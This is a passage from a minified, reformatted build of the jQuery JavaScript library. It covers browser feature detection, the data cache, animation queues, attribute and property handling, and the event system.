                    checkOn: !!r.value,
                    optSelected: s.selected,
                    enctype: !!c.createElement("form").enctype,
                    html5Clone: "<:nav></:nav>" !== c.createElement("nav").cloneNode(!0).outerHTML,
                    boxModel: "CSS1Compat" === c.compatMode,
                    deleteExpando: !0,
                    noCloneEvent: !0,
                    inlineBlockNeedsLayout: !1,
                    shrinkWrapBlocks: !1,
                    reliableMarginRight: !0,
                    boxSizingReliable: !0,
                    pixelPosition: !1
                }, r.checked = !0, e.noCloneChecked = r.cloneNode(!0).checked, i.disabled = !0, e.optDisabled = !s.disabled;
                try {
                    delete d.test
                } catch (b) {
                    e.deleteExpando = !1
                }
                for (p in r = c.createElement("input"), r.setAttribute("value", ""), e.input = "" === r.getAttribute("value"), r.value = "t", r.setAttribute("type", "radio"), e.radioValue = "t" === r.value, r.setAttribute("checked", "t"), r.setAttribute("name", "t"), a = c.createDocumentFragment(), a.appendChild(r), e.appendChecked = r.checked, e.checkClone = a.cloneNode(!0).cloneNode(!0).lastChild.checked, d.attachEvent && (d.attachEvent("onclick", (function () {
                    e.noCloneEvent = !1
                })), d.cloneNode(!0).click()), {
                    submit: !0,
                    change: !0,
                    focusin: !0
                }) d.setAttribute(u = "on" + p, "t"), e[p + "Bubbles"] = u in o || !1 === d.attributes[u].expando;
                return d.style.backgroundClip = "content-box", d.cloneNode(!0).style.backgroundClip = "", e.clearCloneStyle = "content-box" === d.style.backgroundClip, N((function () {
                    var t, n, r,
                        i = "padding:0;margin:0;border:0;display:block;box-sizing:content-box;-moz-box-sizing:content-box;-webkit-box-sizing:content-box;",
                        a = c.getElementsByTagName("body")[0];
                    a && (t = c.createElement("div"), t.style.cssText = "border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px", a.appendChild(t).appendChild(d), d.innerHTML = "<table><tr><td></td><td>t</td></tr></table>", r = d.getElementsByTagName("td"), r[0].style.cssText = "padding:0;margin:0;border:0;display:none", f = 0 === r[0].offsetHeight, r[0].style.display = "", r[1].style.display = "none", e.reliableHiddenOffsets = f && 0 === r[0].offsetHeight, d.innerHTML = "", d.style.cssText = "box-sizing:border-box;-moz-box-sizing:border-box;-webkit-box-sizing:border-box;padding:1px;border:1px;display:block;width:4px;margin-top:1%;position:absolute;top:1%;", e.boxSizing = 4 === d.offsetWidth, e.doesNotIncludeMarginInBodyOffset = 1 !== a.offsetTop, o.getComputedStyle && (e.pixelPosition = "1%" !== (o.getComputedStyle(d, null) || {}).top, e.boxSizingReliable = "4px" === (o.getComputedStyle(d, null) || {width: "4px"}).width, n = d.appendChild(c.createElement("div")), n.style.cssText = d.style.cssText = i, n.style.marginRight = n.style.width = "0", d.style.width = "1px", e.reliableMarginRight = !parseFloat((o.getComputedStyle(n, null) || {}).marginRight)), typeof d.style.zoom !== l && (d.innerHTML = "", d.style.cssText = i + "width:1px;padding:1px;display:inline;zoom:1", e.inlineBlockNeedsLayout = 3 === d.offsetWidth, d.style.display = "block", d.innerHTML = "<div></div>", d.firstChild.style.width = "5px", e.shrinkWrapBlocks = 3 !== d.offsetWidth, e.inlineBlockNeedsLayout && (a.style.zoom = 1)), a.removeChild(t), t = d = r = n = null)
                })), t = i = a = s = n = r = null, e
            }();
            var $ = /(?:\{[\s\S]*\}|\[[\s\S]*\])$/, I = /([A-Z])/g;

            function z(e, t, n, r) {
                if (N.acceptData(e)) {
                    var i, o, s = N.expando, u = "string" == typeof t, l = e.nodeType, c = l ? N.cache : e,
                        f = l ? e[s] : e[s] && s;
                    if (f && c[f] && (r || c[f].data) || !u || n !== a) return f || (l ? e[s] = f = m.pop() || N.guid++ : f = s), c[f] || (c[f] = {}, l || (c[f].toJSON = N.noop)), ("object" == typeof t || "function" == typeof t) && (r ? c[f] = N.extend(c[f], t) : c[f].data = N.extend(c[f].data, t)), i = c[f], r || (i.data || (i.data = {}), i = i.data), n !== a && (i[N.camelCase(t)] = n), u ? (o = i[t], null == o && (o = i[N.camelCase(t)])) : o = i, o
                }
            }

            function X(e, t, n) {
                if (N.acceptData(e)) {
                    var r, i, o, a = e.nodeType, s = a ? N.cache : e, u = a ? e[N.expando] : N.expando;
                    if (s[u]) {
                        if (t && (o = n ? s[u] : s[u].data)) {
                            N.isArray(t) ? t = t.concat(N.map(t, N.camelCase)) : t in o ? t = [t] : (t = N.camelCase(t), t = t in o ? [t] : t.split(" "));
                            for (r = 0, i = t.length; i > r; r++) delete o[t[r]];
                            if (!(n ? U : N.isEmptyObject)(o)) return
                        }
                        (n || (delete s[u].data, U(s[u]))) && (a ? N.cleanData([e], !0) : N.support.deleteExpando || s != s.window ? delete s[u] : s[u] = null)
                    }
                }
            }

            function V(e, t, n) {
                if (n === a && 1 === e.nodeType) {
                    var r = "data-" + t.replace(I, "-$1").toLowerCase();
                    if (n = e.getAttribute(r), "string" == typeof n) {
                        try {
                            n = "true" === n || "false" !== n && ("null" === n ? null : +n + "" === n ? +n : $.test(n) ? N.parseJSON(n) : n)
                        } catch (c) {
                        }
                        N.data(e, t, n)
                    } else n = a
                }
                return n
            }

            function U(e) {
                var t;
                for (t in e) if (("data" !== t || !N.isEmptyObject(e[t])) && "toJSON" !== t) return !1;
                return !0
            }

            N.extend({
                cache: {},
                expando: "jQuery" + (g + Math.random()).replace(/\D/g, ""),
                noData: {embed: !0, object: "clsid:D27CDB6E-AE6D-11cf-96B8-444553540000", applet: !0},
                hasData: function (e) {
                    return e = e.nodeType ? N.cache[e[N.expando]] : e[N.expando], !!e && !U(e)
                },
                data: function (e, t, n) {
                    return z(e, t, n)
                },
                removeData: function (e, t) {
                    return X(e, t)
                },
                _data: function (e, t, n) {
                    return z(e, t, n, !0)
                },
                _removeData: function (e, t) {
                    return X(e, t, !0)
                },
                acceptData: function (e) {
                    if (e.nodeType && 1 !== e.nodeType && 9 !== e.nodeType) return !1;
                    var t = e.nodeName && N.noData[e.nodeName.toLowerCase()];
                    return !t || !0 !== t && e.getAttribute("classid") === t
                }
            }), N.fn.extend({
                data: function (e, t) {
                    var n, r, i = this[0], o = 0, s = null;
                    if (e === a) {
                        if (this.length && (s = N.data(i), 1 === i.nodeType && !N._data(i, "parsedAttrs"))) {
                            for (n = i.attributes; n.length > o; o++) r = n[o].name, r.indexOf("data-") || (r = N.camelCase(r.slice(5)), V(i, r, s[r]));
                            N._data(i, "parsedAttrs", !0)
                        }
                        return s
                    }
                    return "object" == typeof e ? this.each((function () {
                        N.data(this, e)
                    })) : N.access(this, (function (t) {
                        return t === a ? i ? V(i, e, N.data(i, e)) : null : (this.each((function () {
                            N.data(this, e, t)
                        })), a)
                    }), null, t, arguments.length > 1, null, !0)
                }, removeData: function (e) {
                    return this.each((function () {
                        N.removeData(this, e)
                    }))
                }
            }), N.extend({
                queue: function (e, t, n) {
                    var r;
                    return e ? (t = (t || "fx") + "queue", r = N._data(e, t), n && (!r || N.isArray(n) ? r = N._data(e, t, N.makeArray(n)) : r.push(n)), r || []) : a
                }, dequeue: function (e, t) {
                    t = t || "fx";
                    var n = N.queue(e, t), r = n.length, i = n.shift(), o = N._queueHooks(e, t), a = function () {
                        N.dequeue(e, t)
                    };
                    "inprogress" === i && (i = n.shift(), r--), o.cur = i, i && ("fx" === t && n.unshift("inprogress"), delete o.stop, i.call(e, a, o)), !r && o && o.empty.fire()
                }, _queueHooks: function (e, t) {
                    var n = t + "queueHooks";
                    return N._data(e, n) || N._data(e, n, {
                        empty: N.Callbacks("once memory").add((function () {
                            N._removeData(e, t + "queue"), N._removeData(e, n)
                        }))
                    })
                }
            }), N.fn.extend({
                queue: function (e, t) {
                    var n = 2;
                    return "string" != typeof e && (t = e, e = "fx", n--), n > arguments.length ? N.queue(this[0], e) : t === a ? this : this.each((function () {
                        var n = N.queue(this, e, t);
                        N._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && N.dequeue(this, e)
                    }))
                }, dequeue: function (e) {
                    return this.each((function () {
                        N.dequeue(this, e)
                    }))
                }, delay: function (e, t) {
                    return e = N.fx && N.fx.speeds[e] || e, t = t || "fx", this.queue(t, (function (t, n) {
                        var r = setTimeout(t, e);
                        n.stop = function () {
                            clearTimeout(r)
                        }
                    }))
                }, clearQueue: function (e) {
                    return this.queue(e || "fx", [])
                }, promise: function (e, t) {
                    var n, r = 1, i = N.Deferred(), o = this, s = this.length, u = function () {
                        --r || i.resolveWith(o, [o])
                    };
                    "string" != typeof e && (t = e, e = a), e = e || "fx";
                    while (s--) n = N._data(o[s], e + "queueHooks"), n && n.empty && (r++, n.empty.add(u));
                    return u(), i.promise(t)
                }
            });
            var Y, G, J = /[\t\r\n]/g, Q = /\r/g, Z = /^(?:input|select|textarea|button|object)$/i, K = /^(?:a|area)$/i,
                ee = /^(?:checked|selected|autofocus|autoplay|async|controls|defer|disabled|hidden|loop|multiple|open|readonly|required|scoped)$/i,
                te = /^(?:checked|selected)$/i, ne = N.support.getSetAttribute, re = N.support.input;
            N.fn.extend({
                attr: function (e, t) {
                    return N.access(this, N.attr, e, t, arguments.length > 1)
                }, removeAttr: function (e) {
                    return this.each((function () {
                        N.removeAttr(this, e)
                    }))
                }, prop: function (e, t) {
                    return N.access(this, N.prop, e, t, arguments.length > 1)
                }, removeProp: function (e) {
                    return e = N.propFix[e] || e, this.each((function () {
                        try {
                            this[e] = a, delete this[e]
                        } catch (s) {
                        }
                    }))
                }, addClass: function (e) {
                    var t, n, r, i, o, a = 0, s = this.length, u = "string" == typeof e && e;
                    if (N.isFunction(e)) return this.each((function (t) {
                        N(this).addClass(e.call(this, t, this.className))
                    }));
                    if (u) for (t = (e || "").match(E) || []; s > a; a++) if (n = this[a], r = 1 === n.nodeType && (n.className ? (" " + n.className + " ").replace(J, " ") : " ")) {
                        o = 0;
                        while (i = t[o++]) 0 > r.indexOf(" " + i + " ") && (r += i + " ");
                        n.className = N.trim(r)
                    }
                    return this
                }, removeClass: function (e) {
                    var t, n, r, i, o, a = 0, s = this.length, u = 0 === arguments.length || "string" == typeof e && e;
                    if (N.isFunction(e)) return this.each((function (t) {
                        N(this).removeClass(e.call(this, t, this.className))
                    }));
                    if (u) for (t = (e || "").match(E) || []; s > a; a++) if (n = this[a], r = 1 === n.nodeType && (n.className ? (" " + n.className + " ").replace(J, " ") : "")) {
                        o = 0;
                        while (i = t[o++]) while (r.indexOf(" " + i + " ") >= 0) r = r.replace(" " + i + " ", " ");
                        n.className = e ? N.trim(r) : ""
                    }
                    return this
                }, toggleClass: function (e, t) {
                    var n = typeof e, r = "boolean" == typeof t;
                    return N.isFunction(e) ? this.each((function (n) {
                        N(this).toggleClass(e.call(this, n, this.className, t), t)
                    })) : this.each((function () {
                        if ("string" === n) {
                            var i, o = 0, a = N(this), s = t, u = e.match(E) || [];
                            while (i = u[o++]) s = r ? s : !a.hasClass(i), a[s ? "addClass" : "removeClass"](i)
                        } else (n === l || "boolean" === n) && (this.className && N._data(this, "__className__", this.className), this.className = this.className || !1 === e ? "" : N._data(this, "__className__") || "")
                    }))
                }, hasClass: function (e) {
                    for (var t = " " + e + " ", n = 0, r = this.length; r > n; n++) if (1 === this[n].nodeType && (" " + this[n].className + " ").replace(J, " ").indexOf(t) >= 0) return !0;
                    return !1
                }, val: function (e) {
                    var t, n, r, i = this[0];
                    return arguments.length ? (r = N.isFunction(e), this.each((function (t) {
                        var i, o = N(this);
                        1 === this.nodeType && (i = r ? e.call(this, t, o.val()) : e, null == i ? i = "" : "number" == typeof i ? i += "" : N.isArray(i) && (i = N.map(i, (function (e) {
                            return null == e ? "" : e + ""
                        }))), n = N.valHooks[this.type] || N.valHooks[this.nodeName.toLowerCase()], n && "set" in n && n.set(this, i, "value") !== a || (this.value = i))
                    }))) : i ? (n = N.valHooks[i.type] || N.valHooks[i.nodeName.toLowerCase()], n && "get" in n && (t = n.get(i, "value")) !== a ? t : (t = i.value, "string" == typeof t ? t.replace(Q, "") : null == t ? "" : t)) : void 0
                }
            }), N.extend({
                valHooks: {
                    option: {
                        get: function (e) {
                            var t = e.attributes.value;
                            return !t || t.specified ? e.value : e.text
                        }
                    }, select: {
                        get: function (e) {
                            for (var t, n, r = e.options, i = e.selectedIndex, o = "select-one" === e.type || 0 > i, a = o ? null : [], s = o ? i + 1 : r.length, u = 0 > i ? s : o ? i : 0; s > u; u++) if (n = r[u], !(!n.selected && u !== i || (N.support.optDisabled ? n.disabled : null !== n.getAttribute("disabled")) || n.parentNode.disabled && N.nodeName(n.parentNode, "optgroup"))) {
                                if (t = N(n).val(), o) return t;
                                a.push(t)
                            }
                            return a
                        }, set: function (e, t) {
                            var n = N.makeArray(t);
                            return N(e).find("option").each((function () {
                                this.selected = N.inArray(N(this).val(), n) >= 0
                            })), n.length || (e.selectedIndex = -1), n
                        }
                    }
                },
                attr: function (e, t, n) {
                    var r, i, o, s = e.nodeType;
                    if (e && 3 !== s && 8 !== s && 2 !== s) return typeof e.getAttribute === l ? N.prop(e, t, n) : (i = 1 !== s || !N.isXMLDoc(e), i && (t = t.toLowerCase(), r = N.attrHooks[t] || (ee.test(t) ? G : Y)), n === a ? r && i && "get" in r && null !== (o = r.get(e, t)) ? o : (typeof e.getAttribute !== l && (o = e.getAttribute(t)), null == o ? a : o) : null !== n ? r && i && "set" in r && (o = r.set(e, n, t)) !== a ? o : (e.setAttribute(t, n + ""), n) : (N.removeAttr(e, t), a))
                },
                removeAttr: function (e, t) {
                    var n, r, i = 0, o = t && t.match(E);
                    if (o && 1 === e.nodeType) while (n = o[i++]) r = N.propFix[n] || n, ee.test(n) ? !ne && te.test(n) ? e[N.camelCase("default-" + n)] = e[r] = !1 : e[r] = !1 : N.attr(e, n, ""), e.removeAttribute(ne ? n : r)
                },
                attrHooks: {
                    type: {
                        set: function (e, t) {
                            if (!N.support.radioValue && "radio" === t && N.nodeName(e, "input")) {
                                var n = e.value;
                                return e.setAttribute("type", t), n && (e.value = n), t
                            }
                        }
                    }
                },
                propFix: {
                    tabindex: "tabIndex",
                    readonly: "readOnly",
                    for: "htmlFor",
                    class: "className",
                    maxlength: "maxLength",
                    cellspacing: "cellSpacing",
                    cellpadding: "cellPadding",
                    rowspan: "rowSpan",
                    colspan: "colSpan",
                    usemap: "useMap",
                    frameborder: "frameBorder",
                    contenteditable: "contentEditable"
                },
                prop: function (e, t, n) {
                    var r, i, o, s = e.nodeType;
                    if (e && 3 !== s && 8 !== s && 2 !== s) return o = 1 !== s || !N.isXMLDoc(e), o && (t = N.propFix[t] || t, i = N.propHooks[t]), n !== a ? i && "set" in i && (r = i.set(e, n, t)) !== a ? r : e[t] = n : i && "get" in i && null !== (r = i.get(e, t)) ? r : e[t]
                },
                propHooks: {
                    tabIndex: {
                        get: function (e) {
                            var t = e.getAttributeNode("tabindex");
                            return t && t.specified ? parseInt(t.value, 10) : Z.test(e.nodeName) || K.test(e.nodeName) && e.href ? 0 : a
                        }
                    }
                }
            }), G = {
                get: function (e, t) {
                    var n = N.prop(e, t), r = "boolean" == typeof n && e.getAttribute(t),
                        i = "boolean" == typeof n ? re && ne ? null != r : te.test(t) ? e[N.camelCase("default-" + t)] : !!r : e.getAttributeNode(t);
                    return i && !1 !== i.value ? t.toLowerCase() : a
                }, set: function (e, t, n) {
                    return !1 === t ? N.removeAttr(e, n) : re && ne || !te.test(n) ? e.setAttribute(!ne && N.propFix[n] || n, n) : e[N.camelCase("default-" + n)] = e[n] = !0, n
                }
            }, re && ne || (N.attrHooks.value = {
                get: function (e, t) {
                    var n = e.getAttributeNode(t);
                    return N.nodeName(e, "input") ? e.defaultValue : n && n.specified ? n.value : a
                }, set: function (e, t, n) {
                    return N.nodeName(e, "input") ? (e.defaultValue = t, a) : Y && Y.set(e, t, n)
                }
            }), ne || (Y = N.valHooks.button = {
                get: function (e, t) {
                    var n = e.getAttributeNode(t);
                    return n && ("id" === t || "name" === t || "coords" === t ? "" !== n.value : n.specified) ? n.value : a
                }, set: function (e, t, n) {
                    var r = e.getAttributeNode(n);
                    return r || e.setAttributeNode(r = e.ownerDocument.createAttribute(n)), r.value = t += "", "value" === n || t === e.getAttribute(n) ? t : a
                }
            }, N.attrHooks.contenteditable = {
                get: Y.get, set: function (e, t, n) {
                    Y.set(e, "" !== t && t, n)
                }
            }, N.each(["width", "height"], (function (e, t) {
                N.attrHooks[t] = N.extend(N.attrHooks[t], {
                    set: function (e, n) {
                        return "" === n ? (e.setAttribute(t, "auto"), n) : a
                    }
                })
            }))), N.support.hrefNormalized || (N.each(["href", "src", "width", "height"], (function (e, t) {
                N.attrHooks[t] = N.extend(N.attrHooks[t], {
                    get: function (e) {
                        var n = e.getAttribute(t, 2);
                        return null == n ? a : n
                    }
                })
            })), N.each(["href", "src"], (function (e, t) {
                N.propHooks[t] = {
                    get: function (e) {
                        return e.getAttribute(t, 4)
                    }
                }
            }))), N.support.style || (N.attrHooks.style = {
                get: function (e) {
                    return e.style.cssText || a
                }, set: function (e, t) {
                    return e.style.cssText = t + ""
                }
            }), N.support.optSelected || (N.propHooks.selected = N.extend(N.propHooks.selected, {
                get: function (e) {
                    var t = e.parentNode;
                    return t && (t.selectedIndex, t.parentNode && t.parentNode.selectedIndex), null
                }
            })), N.support.enctype || (N.propFix.enctype = "encoding"), N.support.checkOn || N.each(["radio", "checkbox"], (function () {
                N.valHooks[this] = {
                    get: function (e) {
                        return null === e.getAttribute("value") ? "on" : e.value
                    }
                }
            })), N.each(["radio", "checkbox"], (function () {
                N.valHooks[this] = N.extend(N.valHooks[this], {
                    set: function (e, t) {
                        return N.isArray(t) ? e.checked = N.inArray(N(e).val(), t) >= 0 : a
                    }
                })
            }));
            var ie = /^(?:input|select|textarea)$/i, oe = /^key/, ae = /^(?:mouse|contextmenu)|click/,
                se = /^(?:focusinfocus|focusoutblur)$/, ue = /^([^.]*)(?:\.(.+)|)$/;

            function le() {
                return !0
            }

            function ce() {
                return !1
            }

            N.event = {
                global: {},
                add: function (e, t, n, r, i) {
                    var o, s, u, c, f, p, d, h, m, g, y, v = N._data(e);
                    if (v) {
                        n.handler && (c = n, n = c.handler, i = c.selector), n.guid || (n.guid = N.guid++), (s = v.events) || (s = v.events = {}), (p = v.handle) || (p = v.handle = function (e) {
                            return typeof N === l || e && N.event.triggered === e.type ? a : N.event.dispatch.apply(p.elem, arguments)
                        }, p.elem = e), t = (t || "").match(E) || [""], u = t.length;
                        while (u--) o = ue.exec(t[u]) || [], m = y = o[1], g = (o[2] || "").split(".").sort(), f = N.event.special[m] || {}, m = (i ? f.delegateType : f.bindType) || m, f = N.event.special[m] || {}, d = N.extend({
                            type: m,
                            origType: y,
                            data: r,
                            handler: n,
                            guid: n.guid,
                            selector: i,
                            needsContext: i && N.expr.match.needsContext.test(i),
                            namespace: g.join(".")
                        }, c), (h = s[m]) || (h = s[m] = [], h.delegateCount = 0, f.setup && !1 !== f.setup.call(e, r, g, p) || (e.addEventListener ? e.addEventListener(m, p, !1) : e.attachEvent && e.attachEvent("on" + m, p))), f.add && (f.add.call(e, d), d.handler.guid || (d.handler.guid = n.guid)), i ? h.splice(h.delegateCount++, 0, d) : h.push(d), N.event.global[m] = !0;
                        e = null
                    }
                },
                remove: function (e, t, n, r, i) {
                    var o, a, s, u, l, c, f, p, d, h, m, g = N.hasData(e) && N._data(e);
                    if (g && (c = g.events)) {
                        t = (t || "").match(E) || [""], l = t.length;
                        while (l--) if (s = ue.exec(t[l]) || [], d = m = s[1], h = (s[2] || "").split(".").sort(), d) {
                            f = N.event.special[d] || {}, d = (r ? f.delegateType : f.bindType) || d, p = c[d] || [], s = s[2] && RegExp("(^|\\.)" + h.join("\\.(?:.*\\.|)") + "(\\.|$)"), u = o = p.length;
                            while (o--) a = p[o], !i && m !== a.origType || n && n.guid !== a.guid || s && !s.test(a.namespace) || r && r !== a.selector && ("**" !== r || !a.selector) || (p.splice(o, 1), a.selector && p.delegateCount--, f.remove && f.remove.call(e, a));
                            u && !p.length && (f.teardown && !1 !== f.teardown.call(e, h, g.handle) || N.removeEvent(e, d, g.handle), delete c[d])
                        } else for (d in c) N.event.remove(e, d + t[l], n, r, !0);
                        N.isEmptyObject(c) && (delete g.handle, N._removeData(e, "events"))
                    }
                },
                trigger: function (e, t, n, r) {
                    var i, s, u, l, f, p, d, h = [n || c], m = T.call(e, "type") ? e.type : e,
                        g = T.call(e, "namespace") ? e.namespace.split(".") : [];
                    if (u = p = n = n || c, 3 !== n.nodeType && 8 !== n.nodeType && !se.test(m + N.event.triggered) && (m.indexOf(".") >= 0 && (g = m.split("."), m = g.shift(), g.sort()), s = 0 > m.indexOf(":") && "on" + m, e = e[N.expando] ? e : new N.Event(m, "object" == typeof e && e), e.isTrigger = !0, e.namespace = g.join("."), e.namespace_re = e.namespace ? RegExp("(^|\\.)" + g.join("\\.(?:.*\\.|)") + "(\\.|$)") : null, e.result = a, e.target || (e.target = n), t = null == t ? [e] : N.makeArray(t, [e]), f = N.event.special[m] || {}, r || !f.trigger || !1 !== f.trigger.apply(n, t))) {
                        if (!r && !f.noBubble && !N.isWindow(n)) {
                            for (l = f.delegateType || m, se.test(l + m) || (u = u.parentNode); u; u = u.parentNode) h.push(u), p = u;
                            p === (n.ownerDocument || c) && h.push(p.defaultView || p.parentWindow || o)
                        }
                        d = 0;
                        while ((u = h[d++]) && !e.isPropagationStopped()) e.type = d > 1 ? l : f.bindType || m, i = (N._data(u, "events") || {})[e.type] && N._data(u, "handle"), i && i.apply(u, t), i = s && u[s], i && N.acceptData(u) && i.apply && !1 === i.apply(u, t) && e.preventDefault();
                        if (e.type = m, !(r || e.isDefaultPrevented() || f._default && !1 !== f._default.apply(n.ownerDocument, t) || "click" === m && N.nodeName(n, "a")) && N.acceptData(n) && s && n[m] && !N.isWindow(n)) {
                            p = n[s], p && (n[s] = null), N.event.triggered = m;
                            try {
                                n[m]()
                            } catch (C) {
                            }
                            N.event.triggered = a, p && (n[s] = p)
                        }
                        return e.result
                    }
                },
                dispatch: function (e) {
                    e = N.event.fix(e);
                    var t, n, r, i, o, s = [], u = b.call(arguments), l = (N._data(this, "events") || {})[e.type] || [],
                        c = N.event.special[e.type] || {};
                    if (u[0] = e, e.delegateTarget = this, !c.preDispatch || !1 !== c.preDispatch.call(this, e)) {
                        s = N.event.handlers.call(this, e, l), t = 0;
                        while ((i = s[t++]) && !e.isPropagationStopped()) {
                            e.currentTarget = i.elem, o = 0;
                            while ((r = i.handlers[o++]) && !e.isImmediatePropagationStopped()) (!e.namespace_re || e.namespace_re.test(r.namespace)) && (e.handleObj = r, e.data = r.data, n = ((N.event.special[r.origType] || {}).handle || r.handler).apply(i.elem, u), n !== a && !1 === (e.result = n) && (e.preventDefault(), e.stopPropagation()))
                        }
                        return c.postDispatch && c.postDispatch.call(this, e), e.result
                    }
                },
                handlers: function (e, t) {
                    var n, r, i, o, s = [], u = t.delegateCount, l = e.target;
                    if (u && l.nodeType && (!e.button || "click" !== e.type)) for (; l != this; l = l.parentNode || this) if (1 === l.nodeType && (!0 !== l.disabled || "click" !== e.type)) {
                        for (i = [], o = 0; u > o; o++) r = t[o], n = r.selector + " ", i[n] === a && (i[n] = r.needsContext ? N(n, this).index(l) >= 0 : N.find(n, this, null, [l]).length), i[n] && i.push(r);
                        i.length && s.push({elem: l, handlers: i})
                    }
                    return t.length > u && s.push({elem: this, handlers: t.slice(u)}), s
                },
                fix: function (e) {
                    if (e[N.expando]) return e;
                    var t, n, r, i = e.type, o = e, a = this.fixHooks[i];
                    a || (this.fixHooks[i] = a = ae.test(i) ? this.mouseHooks : oe.test(i) ? this.keyHooks : {}), r = a.props ? this.props.concat(a.props) : this.props, e = new N.Event(o), t = r.length;
                    while (t--) n = r[t], e[n] = o[n];
                    return e.target || (e.target = o.srcElement || c), 3 === e.target.nodeType && (e.target = e.target.parentNode), e.metaKey = !!e.metaKey, a.filter ? a.filter(e, o) : e
                },
                props: "altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
                fixHooks: {},
                keyHooks: {
                    props: "char charCode key keyCode".split(" "), filter: function (e, t) {
                        return null == e.which && (e.which = null != t.charCode ? t.charCode : t.keyCode), e
                    }
                },
                mouseHooks: {
                    props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
                    filter: function (e, t) {
                        var n, r, i, o = t.button, s = t.fromElement;
                        return null == e.pageX && null != t.clientX && (r = e.target.ownerDocument || c, i = r.documentElement, n = r.body, e.pageX = t.clientX + (i && i.scrollLeft || n && n.scrollLeft || 0) - (i && i.clientLeft || n && n.clientLeft || 0), e.pageY = t.clientY + (i && i.scrollTop || n && n.scrollTop || 0) - (i && i.clientTop || n && n.clientTop || 0)), !e.relatedTarget && s && (e.relatedTarget = s === e.target ? t.toElement : s), e.which || o === a || (e.which = 1 & o ? 1 : 2 & o ? 3 : 4 & o ? 2 : 0), e
                    }
                },
                special: {
                    load: {noBubble: !0}, click: {
                        trigger: function () {
                            return N.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(), !1) : a
                        }
                    }, focus: {
                        trigger: function () {
                            if (this !== c.activeElement && this.focus) try {
                                return this.focus(), !1
                            } catch (o) {
                            }
                        }, delegateType: "focusin"
                    }, blur: {
                        trigger: function () {
                            return this === c.activeElement && this.blur ? (this.blur(), !1) : a
                        }, delegateType: "focusout"
                    }, beforeunload: {
                        postDispatch: function (e) {
                            e.result !== a && (e.originalEvent.returnValue = e.result)
                        }
                    }
                },
                simulate: function (e, t, n, r) {
                    var i = N.extend(new N.Event, n, {type: e, isSimulated: !0, originalEvent: {}});
                    r ? N.event.trigger(i, null, t) : N.event.dispatch.call(t, i), i.isDefaultPrevented() && n.preventDefault()
                }
            }, N.removeEvent = c.removeEventListener ? function (e, t, n) {
                e.removeEventListener && e.removeEventListener(t, n, !1)
            } : function (e, t, n) {
                var r = "on" + t;
                e.detachEvent && (typeof e[r] === l && (e[r] = null), e.detachEvent(r, n))
            }, N.Event = function (e, t) {
                return this instanceof N.Event ? (e && e.type ? (this.originalEvent = e, this.type = e.type, this.isDefaultPrevented = e.defaultPrevented || !1 === e.returnValue || e.getPreventDefault && e.getPreventDefault() ? le : ce) : this.type = e, t && N.extend(this, t), this.timeStamp = e && e.timeStamp || N.now(), this[N.expando] = !0, a) : new N.Event(e, t)
            }, N.Event.prototype = {
                isDefaultPrevented: ce,
                isPropagationStopped: ce,
                isImmediatePropagationStopped: ce,
                preventDefault: function () {
                    var e = this.originalEvent;
                    this.isDefaultPrevented = le, e && (e.preventDefault ? e.preventDefault() : e.returnValue = !1)
                },
                stopPropagation: function () {
                    var e = this.originalEvent;
                    this.isPropagationStopped = le, e && (e.stopPropagation && e.stopPropagation(), e.cancelBubble = !0)
                },
                stopImmediatePropagation: function () {
                    this.isImmediatePropagationStopped = le, this.stopPropagation()
                }
            }, N.each({mouseenter: "mouseover", mouseleave: "mouseout"}, (function (e, t) {
                N.event.special[e] = {
                    delegateType: t, bindType: t, handle: function (e) {
                        var n, r = this, i = e.relatedTarget, o = e.handleObj;
                        return (!i || i !== r && !N.contains(r, i)) && (e.type = o.origType, n = o.handler.apply(this, arguments), e.type = t), n
                    }
                }
            })), N.support.submitBubbles || (N.event.special.submit = {
                setup: function () {
                    return !N.nodeName(this, "form") && (N.event.add(this, "click._submit keypress._submit", (function (e) {
                        var t = e.target, n = N.nodeName(t, "input") || N.nodeName(t, "button") ? t.form : a;
                        n && !N._data(n, "submitBubbles") && (N.event.add(n, "submit._submit", (function (e) {
                            e._submit_bubble = !0
                        })), N._data(n, "submitBubbles", !0))
                    })), a)
                }, postDispatch: function (e) {
                    e._submit_bubble && (delete e._submit_bubble, this.parentNode && !e.isTrigger && N.event.simulate("submit", this.parentNode, e, !0))
                }, teardown: function () {
                    return !N.nodeName(this, "form") && (N.event.remove(this, "._submit"), a)
                }
            }), N.support.changeBubbles || (N.event.special.change = {
                setup: function () {
                    return ie.test(this.nodeName) ? (("checkbox" === this.type || "radio" === this.type) && (N.event.add(this, "propertychange._change", (function (e) {
                        "checked" === e.originalEvent.propertyName && (this._just_changed = !0)
                    })), N.event.add(this, "click._change", (function (e) {
                        this._just_changed && !e.isTrigger && (this._just_changed = !1), N.event.simulate("change", this, e, !0)
                    }))), !1) : (N.event.add(this, "beforeactivate._change", (function (e) {
                        var t = e.target;
                        ie.test(t.nodeName) && !N._data(t, "changeBubbles") && (N.event.add(t, "change._change", (function (e) {
                            !this.parentNode || e.isSimulated || e.isTrigger || N.event.simulate("change", this.parentNode, e, !0)
                        })), N._data(t, "changeBubbles", !0))
                    })), a)
                }, handle: function (e) {
                    var t = e.target;
                    return this !== t || e.isSimulated || e.isTrigger || "radio" !== t.type && "checkbox" !== t.type ? e.handleObj.handler.apply(this, arguments) : a
                }, teardown: function () {
                    return N.event.remove(this, "._change"), !ie.test(this.nodeName)
                }
            }), N.support.focusinBubbles || N.each({focus: "focusin", blur: "focusout"}, (function (e, t) {
                var n = 0, r = function (e) {
                    N.event.simulate(t, e.target, N.event.fix(e), !0)
                };
                N.event.special[t] = {
                    setup: function () {
                        0 === n++ && c.addEventListener(e, r, !0)
                    }, teardown: function () {
                        0 === --n && c.removeEventListener(e, r, !0)
                    }
                }
            })), N.fn.extend({
                on: function (e, t, n, r, i) {
                    var o, s;
                    if ("object" == typeof e) {
                        for (o in "string" != typeof t && (n = n || t, t = a), e) this.on(o, t, n, e[o], i);
                        return this
                    }
                    if (null == n && null == r ? (r = t, n = t = a) : null == r && ("string" == typeof t ? (r = n, n = a) : (r = n, n = t, t = a)), !1 === r) r = ce; else if (!r) return this;
                    return 1 === i && (s = r, r = function (e) {
                        return N().off(e), s.apply(this, arguments)
                    }, r.guid = s.guid || (s.guid = N.guid++)), this.each((function () {
                        N.event.add(this, e, r, n, t)
                    }))
